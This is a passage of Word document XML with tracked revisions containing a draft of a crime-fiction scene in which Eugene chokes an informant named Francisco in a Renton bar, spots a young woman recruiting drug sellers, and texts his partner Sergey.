      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> bribes… Maybe she knows something you don’t.”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Eugene’s fingers closed around Francisco’s throat. </w:t>
      </w:r>
      <w:ins w:id="25" w:author="TextVet" w:date="2016-03-14T11:30:00Z">
        <w:r w:rsidR="00356EE7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Staring</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="26" w:author="TextVet" w:date="2016-03-14T11:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00356EE7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>He looked</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> into his eyes</w:t>
      </w:r>
      <w:ins w:id="27" w:author="TextVet" w:date="2016-03-14T11:30:00Z">
        <w:r w:rsidR="00356EE7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, he</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="28" w:author="TextVet" w:date="2016-03-14T17:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000B3166">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hissed, “You betray us for </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="29" w:author="TextVet" w:date="2016-03-14T17:43:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t xml:space="preserve">this </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bullshit…?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="007751C1" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="30" w:author="TextVet" w:date="2016-03-14T17:43:00Z">
        <w:r w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>“See for yourself!”</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> honked </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Francisco</w:t>
      </w:r>
      <w:ins w:id="31" w:author="TextVet" w:date="2016-03-14T17:43:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’s</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="32" w:author="TextVet" w:date="2016-03-14T17:43:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="007751C1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> honked out through his</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> squeezed larynx</w:t>
      </w:r>
      <w:ins w:id="33" w:author="TextVet" w:date="2016-03-14T17:43:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="34" w:author="TextVet" w:date="2016-03-14T17:43:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="007751C1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="35" w:author="TextVet" w:date="2016-03-14T17:43:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="007751C1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">“See for yourself!” </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="36" w:author="TextVet" w:date="2016-03-14T17:42:00Z">
        <w:r w:rsidR="00D752B0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Wobbling, h</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="37" w:author="TextVet" w:date="2016-03-14T17:42:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00D752B0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>H</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="38" w:author="TextVet" w:date="2016-03-14T17:41:00Z">
        <w:r w:rsidR="00D752B0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>is arm</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="39" w:author="TextVet" w:date="2016-03-14T17:41:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00D752B0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>e</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="40" w:author="TextVet" w:date="2016-03-14T17:41:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00D752B0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>point</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="41" w:author="TextVet" w:date="2016-03-14T17:42:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00D752B0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ed toward</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="42" w:author="TextVet" w:date="2016-03-14T17:42:00Z">
        <w:r w:rsidR="00D752B0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>indicated</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the back of the bar</w:t>
      </w:r>
      <w:del w:id="43" w:author="TextVet" w:date="2016-03-14T17:41:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00D752B0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> with one wobbly arm</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488"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Eugene’s gaze followed his trembling finger past silhouettes of drunks. Near a pool table, the crowd simply stopped, </w:t>
      </w:r>
      <w:del w:id="44" w:author="TextVet" w:date="2016-03-14T11:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D43647">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">like </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a sea </w:t>
      </w:r>
      <w:ins w:id="45" w:author="TextVet" w:date="2016-03-14T11:31:00Z">
        <w:r w:rsidR="00D43647">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>checked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="46" w:author="TextVet" w:date="2016-03-14T11:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D43647">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>held back</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> by an invisible dam. There, on a tall bar stool, sat a young Asian woman drinking a fluorescent cocktail. Eugene couldn’t make out details, but, amid all the denim vests and grease-stained jeans, her sleek white dress and gladiator stilettos stuck out like a Viagra in a bag of molly.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“She’s </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>here</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>?” Eugene grunted. He released his choke, leaving Francisco wheezing. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>That’s</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> who’s muscling in on our area?”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showed up two weeks ago,” </w:t>
      </w:r>
      <w:del w:id="47" w:author="TextVet" w:date="2016-03-14T11:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D43647">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Francisco</w:t>
      </w:r>
      <w:del w:id="48" w:author="TextVet" w:date="2016-03-14T11:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D43647">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, his voice still</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> rasp</w:t>
      </w:r>
      <w:ins w:id="49" w:author="TextVet" w:date="2016-03-14T11:32:00Z">
        <w:r w:rsidR="00D43647">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="50" w:author="TextVet" w:date="2016-03-14T11:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D43647">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>y</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “She’s been using this joint for a recruiting ground. Each time she comes here, she gets more people signing up to sell for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Eugene squinted. A pink Hello Kitty purse </w:t>
      </w:r>
      <w:ins w:id="51" w:author="TextVet" w:date="2016-03-14T11:32:00Z">
        <w:r w:rsidR="00D43647">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>nes</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="52" w:author="TextVet" w:date="2016-03-14T11:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D43647">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>res</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:ins w:id="53" w:author="TextVet" w:date="2016-03-14T11:32:00Z">
        <w:r w:rsidR="00D43647">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ed </w:t>
      </w:r>
      <w:ins w:id="54" w:author="TextVet" w:date="2016-03-14T11:32:00Z">
        <w:r w:rsidR="00D43647">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="55" w:author="TextVet" w:date="2016-03-14T11:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D43647">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>o</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n the girl’s lap. “She doesn’t even look old enough to be drinking.”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“She’s been growing a network damn fast,” Francisco explained. “I figured, the way she’s going, pretty soon I’d be working for her anyway. And eventually, so would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Eugene smacked him upside the head. “Get the fuck out of here, Francisco. Leave town. If Sergey or I ever see you again, you’re a dead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Sparing no</w:t>
      </w:r>
      <w:ins w:id="56" w:author="TextVet" w:date="2016-03-14T11:33:00Z">
        <w:r w:rsidR="0082009D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> time</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="57" w:author="TextVet" w:date="2016-03-14T11:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0082009D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>t a moment</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, the youth pushed himself </w:t>
      </w:r>
      <w:del w:id="58" w:author="TextVet" w:date="2016-03-14T11:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0082009D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">away </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>from the bar and scuttled for the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watched the girl keenly. Three muscular men shared the empty area with her — one by her side, the other two absorbed in a game of pool. He pulled out his cellphone. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Sergey</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,” he typed. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Get down here. You have to see this.</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reply </w:t>
      </w:r>
      <w:ins w:id="59" w:author="TextVet" w:date="2016-03-14T11:34:00Z">
        <w:r w:rsidR="00A45F88">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>lightninged back</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="60" w:author="TextVet" w:date="2016-03-14T11:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A45F88">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>came quickly</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Busy. Picking the music with Rosie for dance recital. Are you having something more important than evening with daughter?</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carefully slipped his way through the crowd toward the back of the bar. He angled the phone’s camera at the Asian girl, waited for some biker to move his head, and snapped a photo. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>In Renton</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,” he t</w:t>
      </w:r>
      <w:ins w:id="61" w:author="TextVet" w:date="2016-03-14T11:35:00Z">
        <w:r w:rsidR="00014B85">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>humb</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="62" w:author="TextVet" w:date="2016-03-14T11:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00014B85">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>yp</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed beneath the image. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Just take the Tesla, drive is less than 10 minutes.</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waited for a reply. None came.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Before him, the girl sat and drank, texting furiously, saying nothing to her three large companions. Occasionally</w:t>
      </w:r>
      <w:ins w:id="63" w:author="TextVet" w:date="2016-03-14T11:35:00Z">
        <w:r w:rsidR="006D1015">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she would reach into her Hello Kitty </w:t>
      </w:r>
      <w:del w:id="64" w:author="TextVet" w:date="2016-03-14T11:36:00Z">
